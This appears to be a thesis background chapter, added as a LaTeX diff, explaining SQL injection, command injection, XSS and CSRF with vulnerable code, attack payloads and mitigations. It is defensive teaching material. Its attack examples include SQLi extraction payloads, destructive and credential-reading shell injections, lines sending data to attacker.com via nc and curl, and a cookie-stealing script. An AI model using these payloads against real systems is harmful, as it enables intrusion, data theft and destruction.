@@ -1,0 +1,725 @@
+\chapter{Background}
+\label{ch:background}
+
+This section explains the four primary web application vulnerabilities targeted by the proposed platform: SQL Injection (SQLi), Cross-Site Scripting (XSS), Command Injection, and Cross-Site Request Forgery (CSRF). Understanding these vulnerabilities is essential for designing effective detection techniques using both static analysis and machine learning methods.
+
+\section{SQL Injection}
+\label{sec:background_sqli}
+
+SQL Injection (SQLi) is a code injection technique that exploits security vulnerabilities in an application's database layer~\cite{OWASPTop10,OWASPSQLiCheatsheet,CWE89,Halfond2005AMNESIA}. Attackers can manipulate SQL queries by injecting malicious SQL statements into input fields, allowing them to:
+\begin{itemize}
+	\item Access unauthorized data
+	\item Modify or delete database records
+	\item Execute administrative operations
+	\item Bypass authentication mechanisms
+\end{itemize}
+
+\subsection{String Concatenation}
+\label{sec:sqli_string_concat}
+
+String concatenation SQL injection occurs when user input is directly concatenated (joined) with SQL query strings using the plus (+) operator or similar string joining methods.
+
+\textbf{How it works:} When developers build SQL queries by combining strings with user input, attackers can inject malicious SQL code. The database treats the injected code as part of the legitimate query.
+
+\textbf{Example -- Vulnerable Code:}
+
+\begin{lstlisting}[style=pycode]
+username = request.form.get("username")
+query = "SELECT * FROM users WHERE username = '" + username + "'"
+cursor.execute(query)
+\end{lstlisting}
+
+\textbf{Attack Example:} If an attacker enters the following input, the resulting query becomes:
+\begin{lstlisting}[style=attackcode]
+admin' OR '1'='1
+\end{lstlisting}
+\begin{lstlisting}[style=attackcode]
+SELECT * FROM users WHERE username = 'admin' OR '1'='1'
+\end{lstlisting}
+This query returns all users because the condition \texttt{'1'='1'} is always true.
+
+\textbf{Mitigation:} Use parameterized queries (prepared statements) instead of string concatenation:
+
+\begin{lstlisting}[style=pycode]
+username = request.form.get("username")
+query = "SELECT * FROM users WHERE username = %s"
+cursor.execute(query, (username,))
+\end{lstlisting}
+With parameterized queries, the database treats user input as data, not as executable SQL code.
+
+\subsection{F-String Formatting}
+\label{sec:sqli_fstring}
+
+F-string formatting SQL injection occurs when Python f-strings (formatted string literals) are used to directly embed user input into SQL queries.
+
+\textbf{How it works:} F-strings in Python allow embedding expressions directly in strings using curly braces \{\}. When used with SQL queries, user input is directly inserted into the query string, making it vulnerable to injection attacks.
+
+\textbf{Example -- Vulnerable Code:}
+
+\begin{lstlisting}[style=pycode]
+user_id = request.args.get("id")
+query = f"SELECT * FROM users WHERE id = {user_id}"
+cursor.execute(query)
+\end{lstlisting}
+
+\textbf{Attack Example:} If an attacker enters the following input, the resulting query becomes:
+\begin{lstlisting}[style=attackcode]
+1 OR 1=1
+\end{lstlisting}
+\begin{lstlisting}[style=attackcode]
+SELECT * FROM users WHERE id = 1 OR 1=1
+\end{lstlisting}
+This returns all users because the OR condition makes the entire WHERE clause always true.
+
+\textbf{Mitigation:} Never use f-strings with SQL queries. Always use parameterized queries:
+
+\begin{lstlisting}[style=pycode]
+user_id = request.args.get("id")
+query = "SELECT * FROM users WHERE id = %s"
+cursor.execute(query, (user_id,))
+\end{lstlisting}
+Alternative: Use ORM (Object-Relational Mapping) frameworks like SQLAlchemy or Django ORM that handle parameterization automatically.
+
+\subsection{Error-based SQL Injection}
+\label{sec:sqli_error_based}
+
+Error-based SQL injection is a technique where attackers intentionally cause database errors to extract information about the database structure, table names, column names, and data.
+
+\textbf{How it works:} Attackers inject SQL code that causes the database to generate error messages. These error messages often contain valuable information about the database structure, which attackers use to craft more sophisticated attacks.
+
+\textbf{Example -- Vulnerable Code:}
+
+\begin{lstlisting}[style=pycode]
+user_id = request.form.get("id")
+query = f"SELECT * FROM users WHERE id = {user_id}"
+try:
+    result = cursor.execute(query)
+except Exception as e:
+    return str(e)  # Vulnerable: exposing error details
+\end{lstlisting}
+
+\textbf{Attack Example:} Attacker injects SQL that causes an error revealing the database version. Example payloads:
+\begin{lstlisting}[style=attackcode]
+1 AND (SELECT * FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)
+\end{lstlisting}
+MySQL-specific example:
+\begin{lstlisting}[style=attackcode]
+1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --
+\end{lstlisting}
+
+\textbf{Mitigation:} (1) Use parameterized queries to prevent injection. (2) Never expose detailed error messages to users. (3) Log errors server-side but return generic messages to clients:
+
+\begin{lstlisting}[style=pycode]
+try:
+    cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
+except Exception as e:
+    logger.error(f"Database error: {e}")  # Log internally
+    return "An error occurred. Please try again."  # Generic message
+\end{lstlisting}
+
+\subsection{Union-based SQL Injection}
+\label{sec:sqli_union}
+
+Union-based SQL injection uses the SQL UNION operator to combine the results of the original query with results from a malicious query, allowing attackers to retrieve data from other tables.
+
+\textbf{How it works:} The UNION operator combines results from multiple SELECT statements. Attackers exploit this by injecting a UNION SELECT statement that retrieves data from tables they should not have access to.
+
+\textbf{Example -- Vulnerable Code:}
+
+\begin{lstlisting}[style=pycode]
+category = request.args.get("category")
+query = f"SELECT name, price FROM products WHERE category = '{category}'"
+cursor.execute(query)
+\end{lstlisting}
+
+\textbf{Attack Example:} Attacker injects a UNION SELECT to retrieve data from other tables. Injected payload and resulting query:
+\begin{lstlisting}[style=attackcode]
+' UNION SELECT username, password FROM users --
+\end{lstlisting}
+\begin{lstlisting}[style=attackcode]
+SELECT name, price FROM products WHERE category = '' UNION SELECT username, password FROM users --'
+\end{lstlisting}
+To find the correct column count, attackers use \texttt{' UNION SELECT NULL, NULL, NULL -{}-} or \texttt{' UNION SELECT 1, 2, 3 -{}-} to identify which columns are displayed.
+
+\textbf{Mitigation:} Use parameterized queries; implement proper access controls at the database level; limit columns returned; validate and sanitize all input:
+
+\begin{lstlisting}[style=pycode]
+category = request.args.get("category")
+query = "SELECT name, price FROM products WHERE category = %s"
+cursor.execute(query, (category,))
+\end{lstlisting}
+
+\subsection{Boolean-based Blind SQL Injection}
+\label{sec:sqli_boolean_blind}
+
+Boolean-based blind SQL injection is a technique where attackers infer information from the database by observing how the application responds to true or false conditions, even when no data is directly returned.
+
+\textbf{How it works:} Attackers inject SQL conditions that evaluate to TRUE or FALSE. By observing differences in the application's response (different error messages, response times, or page content), they can determine if the injected condition is true or false and extract data bit by bit.
+
+\textbf{Example -- Vulnerable Code:}
+
+\begin{lstlisting}[style=pycode]
+user_id = request.args.get("id")
+query = f"SELECT * FROM users WHERE id = {user_id}"
+result = cursor.execute(query)
+if result:
+    return "User found"  # Different response
+else:
+    return "User not found"  # Different response
+\end{lstlisting}
+
+\textbf{Attack Example:} Attacker sends conditions that evaluate to TRUE or FALSE; the application response reveals the result. Example payloads:
+\begin{lstlisting}[style=attackcode]
+1 AND 1=1
+\end{lstlisting}
+returns ``User found'' (TRUE);
+\begin{lstlisting}[style=attackcode]
+1 AND 1=2
+\end{lstlisting}
+returns ``User not found'' (FALSE). To extract data character by character:
+\begin{lstlisting}[style=attackcode]
+1 AND SUBSTRING((SELECT password FROM users WHERE id=1), 1, 1) = 'a'
+\end{lstlisting}
+This works even when error messages are suppressed.
+
+\textbf{Mitigation:} Use parameterized queries; use consistent response formats; implement rate limiting; use WAFs to detect injection patterns. Validate input (e.g., require numeric \texttt{user\_id}) and use parameterized queries.
+
+\subsection{Time-based Blind SQL Injection}
+\label{sec:sqli_time_based}
+
+Time-based blind SQL injection is a technique where attackers infer information by observing how long the database takes to respond. Attackers inject SQL functions that cause delays; the presence or absence of a delay reveals information about the data.
+
+\textbf{How it works:} Attackers inject SQL functions like \texttt{SLEEP()}, \texttt{WAITFOR DELAY}, or \texttt{BENCHMARK()} that cause the database to pause. If the injected condition is true, the delay occurs; if false, no delay occurs. By measuring response times, attackers can extract data character by character. Database-specific delay functions: MySQL: \texttt{SLEEP(5)}, \texttt{BENCHMARK(1000000, MD5('test'))}; PostgreSQL: \texttt{pg\_sleep(5)}; MS SQL: \texttt{WAITFOR DELAY '00:00:05'}; Oracle: \texttt{DBMS\_PIPE.RECEIVE\_MESSAGE}. This works when no error messages are shown, responses are identical, or no data is returned.
+
+\textbf{Example -- Vulnerable Code:}
+
+\begin{lstlisting}[style=pycode]
+user_id = request.args.get("id")
+query = f"SELECT * FROM users WHERE id = {user_id}"
+start_time = time.time()
+cursor.execute(query)
+response_time = time.time() - start_time
+\end{lstlisting}
+
+\textbf{Attack Example:} Attacker uses time delays to infer TRUE/FALSE. Example payloads:
+\begin{lstlisting}[style=attackcode]
+1 AND IF(1=1, SLEEP(5), 0)
+\end{lstlisting}
+causes a 5-second delay (TRUE);
+\begin{lstlisting}[style=attackcode]
+1 AND IF(1=2, SLEEP(5), 0)
+\end{lstlisting}
+returns immediately (FALSE). To extract data character by character:
+\begin{lstlisting}[style=attackcode]
+1 AND IF(SUBSTRING((SELECT password FROM users WHERE id=1), 1, 1) = 'a', SLEEP(5), 0)
+\end{lstlisting}
+If the response is delayed 5 seconds, the first character is `a'.
+
+\textbf{Mitigation:} Use parameterized queries; implement query timeout limits; monitor unusually slow queries; use connection pooling with timeouts; implement rate limiting; use WAFs to detect delay-based patterns. Validate and sanitize input; use parameterized queries.
+
+\section{Command Injection}
+\label{sec:background_cmd_injection}
+
+Command Injection is a critical security vulnerability that occurs when an application passes unsafe user-supplied data to a system shell~\cite{OWASPTop10,OWASPCommandInjection,CWE78}. Attackers can execute arbitrary operating system commands on the server, potentially leading to:
+\begin{itemize}
+	\item Unauthorized system access
+	\item Data theft or deletion
+	\item System compromise
+	\item Lateral movement in networks
+	\item Complete server takeover
+\end{itemize}
+
+\subsection{OS System Calls}
+\label{sec:cmd_os_system}
+
+OS system calls refer to direct execution of operating system commands using functions like \texttt{os.system()}, \texttt{os.popen()}, or similar methods that execute commands in the system shell.
+
+\textbf{How it works:} When user input is directly passed to \texttt{os.system()} or similar functions, attackers can inject command separators (\texttt{;}, \texttt{\&\&}, \texttt{||}, \texttt{|}) to execute additional malicious commands. The system executes the injected commands with the same privileges as the application.
+
+\textbf{Example -- Vulnerable Code:}
+
+\begin{lstlisting}[style=pycode]
+import os
+filename = request.form.get("filename")
+os.system(f"cat {filename}")
+\end{lstlisting}
+
+\textbf{Attack Example:} Attacker submits malicious input so the shell runs extra commands. Example:
+\begin{lstlisting}[style=attackcode]
+file.txt; rm -rf /
+\end{lstlisting}
+The command becomes \texttt{cat file.txt; rm -rf /}, executing \texttt{cat} then deleting all files. Other dangerous injections:
+\begin{lstlisting}[style=attackcode]
+file.txt && whoami
+file.txt | nc attacker.com 1234
+file.txt || curl http://attacker.com/steal
+\end{lstlisting}
+
+\textbf{Mitigation:} Never use \texttt{os.system()} with user input; use \texttt{subprocess.run()} with \texttt{shell=False} and a list of arguments; validate and sanitize input; use whitelist validation:
+
+\begin{lstlisting}[style=pycode]
+import subprocess
+filename = request.form.get("filename")
+# Validate filename - only allow alphanumeric and dots
+if not re.match(r"^[a-zA-Z0-9.]+$", filename):
+    return "Invalid filename"
+# Use subprocess with shell=False and list of arguments
+result = subprocess.run(["cat", filename], capture_output=True, text=True, shell=False)
+\end{lstlisting}
+
+\subsection{Subprocess Vulnerabilities}
+\label{sec:cmd_subprocess}
+
+Subprocess vulnerabilities occur when the \texttt{subprocess} module is used with \texttt{shell=True}, allowing user input to be interpreted as shell commands. Even with \texttt{shell=False}, improper argument handling can lead to command injection.
+
+\textbf{How it works:} When subprocess functions are called with \texttt{shell=True}, the command string is passed to the system shell, which interprets special characters. Attackers can inject command separators, redirects, or other shell metacharacters.
+
+\textbf{Example -- Vulnerable Code:}
+
+\begin{lstlisting}[style=pycode]
+import subprocess
+user_input = request.args.get("cmd")
+subprocess.call(f"ping {user_input}", shell=True)
+\end{lstlisting}
+
+\textbf{Attack Example:} Attacker injects a command separator and malicious command. Example:
+\begin{lstlisting}[style=attackcode]
+8.8.8.8; cat /etc/passwd
+\end{lstlisting}
+The command becomes \texttt{ping 8.8.8.8; cat /etc/passwd}, executing \texttt{ping} then displaying the password file. Another vulnerable pattern: \texttt{subprocess.Popen(f"ls \{directory\}", shell=True)}.
+
+\textbf{Mitigation:} Always use \texttt{shell=False}; pass commands as a list of arguments; validate all arguments; use absolute paths when possible:
+
+\begin{lstlisting}[style=pycode]
+import subprocess
+ip_address = request.args.get("ip")
+# Validate IP address format
+if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip_address):
+    return "Invalid IP address"
+# Use list of arguments with shell=False
+subprocess.run(["ping", "-c", "4", ip_address], shell=False)
+\end{lstlisting}
+
+\subsection{Shell Execution Methods}
+\label{sec:cmd_shell_exec}
+
+Shell execution methods include executing shell commands via backticks, \texttt{eval()}, \texttt{exec()}, or constructing shell command strings that are then executed.
+
+\textbf{How it works:} Attackers exploit applications that construct shell command strings from user input. By injecting shell metacharacters, command separators, or escape sequences, attackers can break out of the intended command context and execute arbitrary commands.
+
+\textbf{Example -- Vulnerable Code:}
+
+\begin{lstlisting}[style=pycode]
+import os
+command = f"grep {pattern} {filename}"
+os.system(command)
+\end{lstlisting}
+Another vulnerable pattern: \texttt{result = os.popen(f"ls \{directory\}").read()}.
+
+\textbf{Attack Example:} Attacker breaks out of the intended command and runs another. Example:
+\begin{lstlisting}[style=attackcode]
+test"; cat /etc/passwd; echo "
+\end{lstlisting}
+This breaks out of \texttt{grep} and executes \texttt{cat /etc/passwd}. Other techniques: \texttt{\$(command)}, backticks, \texttt{;}, \texttt{\&\&}, \texttt{||}, \texttt{|}.
+
+\textbf{Mitigation:} Avoid constructing shell command strings from user input; use \texttt{subprocess} with \texttt{shell=False} and argument lists; strict input validation; escape or quote arguments if shell is unavoidable; use higher-level APIs:
+
+\begin{lstlisting}[style=pycode]
+import subprocess
+# Use subprocess with argument list - no shell interpretation
+result = subprocess.run(["grep", pattern, filename], capture_output=True, text=True, shell=False)
+\end{lstlisting}
+
+\subsection{Eval-Based Command Execution}
+\label{sec:cmd_eval}
+
+Eval-based command execution occurs when user input is passed to \texttt{eval()}, \texttt{exec()}, or similar functions that execute code dynamically. This allows arbitrary code execution.
+
+\textbf{How it works:} The \texttt{eval()} and \texttt{exec()} functions in Python execute code dynamically. When user input is passed to these functions, attackers can inject arbitrary Python code to execute system commands or perform other malicious actions.
+
+\textbf{Example -- Vulnerable Code:}
+
+\begin{lstlisting}[style=pycode]
+user_expression = request.form.get("expression")
+result = eval(user_expression)
+\end{lstlisting}
+Another dangerous pattern: \texttt{exec(f"import os; os.system('\{command\}')")}.
+
+\textbf{Attack Example:} Attacker injects Python code that runs with \texttt{eval()}. Example:
+\begin{lstlisting}[style=pycode]
+__import__("os").system("rm -rf /")
+\end{lstlisting}
+Other dangerous injections:
+\begin{lstlisting}[style=pycode]
+__import__("subprocess").call(["cat", "/etc/passwd"])
+open("/etc/passwd").read()
+\end{lstlisting}
+Or accessing internal classes via \texttt{\_\_subclasses\_\_}.
+
+\textbf{Mitigation:} Never use \texttt{eval()} or \texttt{exec()} with user input; use safe expression evaluators or mathematical libraries; implement a whitelist of allowed operations; use AST parsing to validate expressions; run in sandboxed environments if dynamic execution is necessary:
+
+\begin{lstlisting}[style=pycode]
+import ast
+# Use safe expression evaluator or validate AST
+def safe_eval(expression):
+    # Only allow simple mathematical expressions
+    allowed_nodes = (ast.Expression, ast.BinOp, ast.Num, ast.Name)
+    tree = ast.parse(expression, mode="eval")
+    # Validate all nodes are in whitelist
+\end{lstlisting}
+
+\subsection{Shell Script Generation}
+\label{sec:cmd_shell_script}
+
+Shell script generation vulnerabilities occur when applications dynamically create shell scripts (bash, sh, batch files) from user input and then execute them.
+
+\textbf{How it works:} When applications generate shell scripts by embedding user input into script templates, attackers can inject shell commands, script control structures, or other malicious code. The generated script runs with the application's privileges.
+
+\textbf{Example -- Vulnerable Code:}
+
+\begin{lstlisting}[style=pycode]
+script_content = f"""#!/bin/bash
+echo "Processing {user_input}"
+"""
+with open("script.sh", "w") as f:
+    f.write(script_content)
+os.system("bash script.sh")
+\end{lstlisting}
+
+\textbf{Attack Example:} Attacker injects shell commands into the generated script. Example:
+\begin{lstlisting}[style=attackcode]
+file"; rm -rf /; echo "
+\end{lstlisting}
+The generated script then executes \texttt{rm -rf /}, deleting all files.
+
+\textbf{Mitigation:} Avoid generating shell scripts from user input; use configuration files or APIs instead; if necessary, use template engines with strict escaping; validate and sanitize all input; use parameterized script templates. Use \texttt{shlex.quote(user\_input)} to properly escape for shell if substitution is required.
+
+\subsection{Environment Variable Usage}
+\label{sec:cmd_env_var}
+
+Environment variable usage vulnerabilities occur when user input is used to set or modify environment variables that are then used in command execution. Attackers can manipulate environment variables to inject malicious commands.
+
+\textbf{How it works:} When user input sets environment variables (via \texttt{os.environ} or \texttt{subprocess} \texttt{env} parameter) and those variables are later used in command execution, attackers can inject command separators or shell metacharacters that the shell interprets when the command runs.
+
+\textbf{Example -- Vulnerable Code:}
+
+\begin{lstlisting}[style=pycode]
+import os
+user_path = request.form.get("path")
+os.environ["PATH"] = user_path
+os.system("some_command")  # Uses modified PATH
+\end{lstlisting}
+Another vulnerable pattern: \texttt{env = \{"CUSTOM\_VAR": user\_input\}} with \texttt{subprocess.run(..., shell=True, env=env)}.
+
+\textbf{Attack Example:} Attacker sets environment variables to malicious values. Example:
+\begin{lstlisting}[style=attackcode]
+/usr/bin:/bin; rm -rf /; /usr/local/bin
+\end{lstlisting}
+The shell executes \texttt{rm -rf /} when the modified PATH is used. Or:
+\begin{lstlisting}[style=attackcode]
+CUSTOM_VAR=$(cat /etc/passwd)
+\end{lstlisting}
+so command substitution runs when the variable is used.
+
+\textbf{Mitigation:} Validate all environment variable values; use whitelist validation; avoid using user input to modify critical variables (PATH, LD\_LIBRARY\_PATH); use \texttt{subprocess} with explicit environment dictionaries; sanitize values to remove shell metacharacters:
+
+\begin{lstlisting}[style=pycode]
+import subprocess
+# Validate path - only allow alphanumeric, slashes, and colons
+if not re.match(r"^[/a-zA-Z0-9:]+$", user_path):
+    return "Invalid path"
+# Create safe environment dictionary
+safe_env = os.environ.copy()
+safe_env["CUSTOM_PATH"] = user_path  # Validated value
+subprocess.run(["command"], env=safe_env, shell=False)
+\end{lstlisting}
+
+\section{Cross-Site Scripting (XSS)}
+\label{sec:background_xss}
+
+Cross-Site Scripting (XSS) is a critical security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users~\cite{OWASPTop10,OWASPXSSCheatsheet,CWE79,MDNCSP,XSSRef1}. XSS attacks occur when an application includes untrusted data in a web page without proper validation or escaping, enabling attackers to execute scripts in the victim's browser context.
+
+\subsection{Reflected XSS}
+\label{sec:xss_reflected}
+
+Reflected XSS (also known as Non-Persistent XSS) occurs when malicious scripts are reflected off a web server, such as in error messages, search results, or any response that includes some or all of the input sent to the server as part of a request.
+
+\textbf{How it works:} The attacker crafts a malicious URL or form submission containing JavaScript code. When the victim clicks the link or submits the form, the malicious script is sent to the server and immediately reflected back in the response, executing in the victim's browser.
+
+\textbf{Example -- Vulnerable Code:}
+
+\begin{lstlisting}[style=pycode]
+from flask import Flask, request, render_template_string
+app = Flask(__name__)
+@app.route("/search")
+def search():
+    query = request.args.get("q")
+    return f"<h1>Search results for: {query}</h1>"
+\end{lstlisting}
+
+\textbf{Attack Example:} Attacker sends the victim a malicious URL. When the victim clicks, the script executes in their browser:
+\begin{lstlisting}[style=attackcode]
+http://example.com/search?q=<script>alert(document.cookie)</script>
+\end{lstlisting}
+The script may steal session cookies or perform other malicious actions.
+
+\textbf{Mitigation:} Always escape/encode user input before outputting to HTML; use context-aware encoding (HTML, JavaScript, CSS, URL); implement Content Security Policy (CSP); validate and sanitize all input~\cite{OWASPXSSCheatsheet,OWASPCSPCheatsheet,OWASPInputValidationCheatsheet,OWASPASVS}. Example with \texttt{escape()}:
+
+\begin{lstlisting}[style=pycode]
+from flask import Flask, request, escape
+@app.route("/search")
+def search():
+    query = request.args.get("q", "")
+    return f"<h1>Search results for: {escape(query)}</h1>"
+\end{lstlisting}
+Better: use template engines that auto-escape by default (Jinja2, Django templates).
+
+\subsection{Stored XSS}
+\label{sec:xss_stored}
+
+Stored XSS (also known as Persistent XSS) occurs when malicious scripts are permanently stored on the target server (e.g., in a database, forum, visitor log, or comment field) and later displayed to other users.
+
+\textbf{How it works:} The attacker submits malicious content (typically via a form) that is stored on the server. When other users view the page containing the stored content, the script executes in their browsers. This is more dangerous than reflected XSS because it affects all users who view the compromised page.
+
+\textbf{Example -- Vulnerable Code:}
+
+\begin{lstlisting}[style=pycode]
+from flask import Flask, request
+comments = []  # In-memory storage
+@app.route("/comment", methods=["POST"])
+def add_comment():
+    comment = request.form.get("comment")
+    comments.append(comment)  # Stored without sanitization
+@app.route("/comments")
+def show_comments():
+    html = "<br>".join(comments)
+    return html
+\end{lstlisting}
+
+\textbf{Attack Example:} Attacker submits a comment containing malicious script that is stored and executed for every viewer:
+\begin{lstlisting}[style=attackcode]
+<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>
+\end{lstlisting}
+Every user who views the comments page may have their session cookies sent to the attacker's server.
+
+\textbf{Mitigation:} Sanitize and validate all user input before storing; escape/encode all output when displaying; use CSP; use HTML sanitization libraries (e.g., \texttt{bleach} for Python): \texttt{clean\_comment = bleach.clean(comment, tags=[], strip=True)}~\cite{OWASPXSSCheatsheet,OWASPHTMLSanitizationCheatsheet}.
+
+\subsection{DOM-based XSS}
+\label{sec:xss_dom}
+
+DOM-based XSS occurs when the attack payload is executed as a result of modifying the DOM in the victim's browser. The malicious code is not sent to the server but is executed entirely in client-side JavaScript.
+
+\textbf{How it works:} The attacker crafts a URL or manipulates client-side code so that the application writes user-controllable data to a dangerous location in the DOM. When the page loads, the malicious script executes. This can bypass server-side protections because the attack happens entirely in the browser.
+
+\textbf{Example -- Vulnerable Code:}
+
+\begin{lstlisting}[language=JavaScript, basicstyle=\ttfamily\small, keywordstyle=\color{blue}, frame=single, breaklines=true, breakatwhitespace=false]
+<div id="content"></div>
+<script>
+    const params = new URLSearchParams(window.location.search);
+    const name = params.get("name");
+    document.getElementById("content").innerHTML = name;
+</script>
+\end{lstlisting}
+
+\textbf{Attack Example:} Attacker sends a URL whose parameter is inserted into the DOM; the payload runs when rendered:
+\begin{lstlisting}[style=attackcode]
+http://example.com/page?name=<img src=x onerror="alert(document.cookie)">
+\end{lstlisting}
+The JavaScript extracts the \texttt{name} parameter and inserts it into \texttt{innerHTML}, causing the script to execute.
+
+\textbf{Mitigation:} Avoid dangerous DOM methods (\texttt{innerHTML}, \texttt{outerHTML}, \texttt{document.write}); use safe methods (\texttt{textContent}, \texttt{setAttribute}); validate and sanitize data from URL parameters and other client-side sources; use CSP~\cite{OWASPXSSCheatsheet,OWASPCSPCheatsheet,OWASPInputValidationCheatsheet}. Use \texttt{textContent} instead of \texttt{innerHTML}: \texttt{document.getElementById("content").textContent = name;} (automatically escapes).
+
+\subsection{JavaScript Context Injection}
+\label{sec:xss_js_context}
+
+JavaScript Context Injection occurs when user input is directly inserted into JavaScript code without proper encoding or validation, allowing attackers to break out of the intended context and execute arbitrary code.
+
+\textbf{How it works:} Attackers inject malicious JavaScript that runs when the page loads. This can happen when user input is embedded in \texttt{<script>} tags, event handlers, JavaScript variables, or other JavaScript contexts. The injected code runs with the same privileges as the page's legitimate script.
+
+\textbf{Example -- Vulnerable Code:}
+
+\begin{lstlisting}[style=pycode]
+username = request.args.get("name")
+return f'<script>var username = "{username}";</script>'
+\end{lstlisting}
+
+\textbf{Attack Example:} Attacker breaks out of the JavaScript string and injects code. Injected payload:
+\begin{lstlisting}[style=attackcode]
+"; alert(document.cookie); var x="
+\end{lstlisting}
+URL: \texttt{http://example.com/user?name="; alert(document.cookie); var x="}. This breaks out of the string and executes \texttt{alert(document.cookie)}.
+
+\textbf{Mitigation:} Never use \texttt{eval()} with user input; encode data for JavaScript context using JSON encoding; avoid embedding user input directly in \texttt{<script>} tags; use data attributes and read them safely. Example:
+
+\begin{lstlisting}[style=pycode]
+import json
+username_json = json.dumps(username)
+return f'<script>var username = {username_json};</script>'
+\end{lstlisting}
+
+\section{Cross-Site Request Forgery (CSRF)}
+\label{sec:background_csrf}
+
+Cross-Site Request Forgery (CSRF) is a security vulnerability that forces authenticated users to execute unwanted actions on a web application~\cite{OWASPTop10,OWASPCSRCheatsheet,OWASPSessionManagementCheatsheet,OWASPAuthenticationCheatsheet,CWE352,XSSRef2,MDNSameSite,RFC6265}. Attackers exploit the trust that a site has in a user's browser by tricking the user into submitting a request to the vulnerable application. CSRF attacks can lead to:
+\begin{itemize}
+	\item Unauthorized state changes (password changes, email changes)
+	\item Unauthorized financial transactions
+	\item Data deletion or modification
+	\item Account takeover
+	\item Privilege escalation
+\end{itemize}
+
+\subsection{Unprotected POST Routes}
+\label{sec:csrf_unprotected_post}
+
+Unprotected POST routes are endpoints that accept POST requests without CSRF token validation. Attackers can craft malicious forms or scripts that submit POST requests on behalf of authenticated users.
+
+\textbf{How it works:} When a POST route lacks CSRF protection, an attacker can create a malicious website with a form or script that automatically submits a POST request to the vulnerable endpoint. If the user is authenticated, the browser includes their session cookies, making the request appear legitimate.
+
+\textbf{Example -- Vulnerable Code:}
+
+\begin{lstlisting}[style=pycode]
+from flask import Flask, request
+app = Flask(__name__)
+@app.route("/change-password", methods=["POST"])
+def change_password():
+    new_password = request.form.get("password")
+    # Change password without CSRF validation
+    update_user_password(new_password)
+\end{lstlisting}
+
+\textbf{Attack Example:} Attacker creates a malicious site with a form that POSTs to the victim site. Example:
+\begin{lstlisting}[style=attackcode]
+<form action="http://victim-site.com/change-password" method="POST">
+  <input name="password" value="attacker123">
+  <button type="submit">Submit</button>
+</form>
+\end{lstlisting}
+When an authenticated user visits and submits, their password is changed without their knowledge.
+
+\textbf{Mitigation:} Implement CSRF token validation for all state-changing operations; use CSRF protection middleware (Flask-WTF, Django CSRF middleware); validate tokens on every POST/PUT/DELETE; use SameSite cookie attribute. Example with Flask-WTF:
+
+\begin{lstlisting}[style=pycode]
+from flask import Flask, request
+from flask_wtf.csrf import CSRFProtect
+app = Flask(__name__)
+csrf = CSRFProtect(app)  # Enable CSRF protection
+@app.route("/change-password", methods=["POST"])
+def change_password():
+    # CSRF token is automatically validated by Flask-WTF
+    new_password = request.form.get("password")
+\end{lstlisting}
+
+\subsection{Direct Form Processing}
+\label{sec:csrf_direct_form}
+
+Direct form processing occurs when applications process form data directly from \texttt{request.form} without validating CSRF tokens, allowing attackers to submit forms from external sites.
+
+\textbf{How it works:} When applications use \texttt{request.form.get()} or \texttt{request.form[]} without checking for CSRF tokens, any website can submit forms to these endpoints. The browser automatically includes session cookies.
+
+\textbf{Example -- Vulnerable Code:}
+
+\begin{lstlisting}[style=pycode]
+@app.route("/transfer", methods=["POST"])
+def transfer_money():
+    amount = request.form.get("amount")
+    recipient = request.form.get("recipient")
+    # Process transfer without CSRF validation
+    process_transfer(amount, recipient)
+\end{lstlisting}
+
+\textbf{Attack Example:} Attacker embeds a request that runs when the victim loads the page. Example (GET-style trigger):
+\begin{lstlisting}[style=attackcode]
+<img src="http://bank.com/transfer?amount=1000&recipient=attacker">
+\end{lstlisting}
+Or using \texttt{fetch()} to POST to the transfer endpoint. When an authenticated user visits the malicious page, the transfer executes automatically.
+
+\textbf{Mitigation:} Always validate CSRF tokens before processing form data; use framework CSRF protection; implement double-submit cookie pattern; verify Origin or Referer header. Use FlaskForm with \texttt{form.validate\_on\_submit()} so the CSRF token is included and validated automatically.
+
+\subsection{AJAX Operations Without CSRF}
+\label{sec:csrf_ajax}
+
+AJAX operations without CSRF protection are vulnerable when JavaScript makes POST/PUT/DELETE requests without including CSRF tokens in headers or request bodies.
+
+\textbf{How it works:} If AJAX requests do not include CSRF tokens, attackers can craft malicious JavaScript on external sites that executes these requests, exploiting the user's authenticated session.
+
+\textbf{Example -- Vulnerable Code:}
+
+\begin{lstlisting}[language=JavaScript, basicstyle=\ttfamily\small, keywordstyle=\color{blue}, frame=single, breaklines=true, breakatwhitespace=false]
+// Client-side JavaScript
+$.ajax({
+    url: "/api/delete-account",
+    method: "POST",
+    data: {confirm: true}
+    // Missing CSRF token in headers
+});
+\end{lstlisting}
+
+\textbf{Attack Example:} Attacker's site includes JavaScript that sends a POST request using the victim's credentials:
+\begin{lstlisting}[language=JavaScript, basicstyle=\ttfamily\small, keywordstyle=\color{blue}, frame=single, breaklines=true, breakatwhitespace=false]
+fetch("http://victim-site.com/api/delete-account", {
+  method: "POST",
+  body: JSON.stringify({confirm: true}),
+  credentials: "include"
+});
+\end{lstlisting}
+When an authenticated user visits, their account is deleted.
+
+\textbf{Mitigation:} Include CSRF tokens in AJAX request headers (\texttt{X-CSRF-Token}) or in the request body; use framework-provided AJAX CSRF protection; validate tokens on the server. Example: read token from \texttt{meta[name="csrf-token"]} and set \texttt{headers: \{"X-CSRF-Token": csrfToken\}} in the \texttt{\$.ajax()} call.
+
+\subsection{HTML Forms Without Tokens}
+\label{sec:csrf_html_forms}
+
+HTML forms without CSRF tokens are vulnerable when they submit state-changing operations without including or validating CSRF tokens.
+
+\textbf{How it works:} When HTML forms do not include CSRF token fields, attackers can replicate these forms on external sites. When users submit, the browser includes session cookies, so requests appear legitimate although they originate from malicious sites.
+
+\textbf{Example -- Vulnerable Code:} A form that POSTs to \texttt{/update-profile} with \texttt{email} and submit button but no CSRF token field.
+
+\textbf{Attack Example:} Attacker replicates the form on their site and auto-submits it. Example:
+\begin{lstlisting}[style=attackcode]
+<form action="http://victim-site.com/update-profile" method="POST">
+  <input name="email" value="attacker@evil.com">
+</form>
+<script>document.forms[0].submit();</script>
+\end{lstlisting}
+When an authenticated user visits, the form submits and changes their email.
+
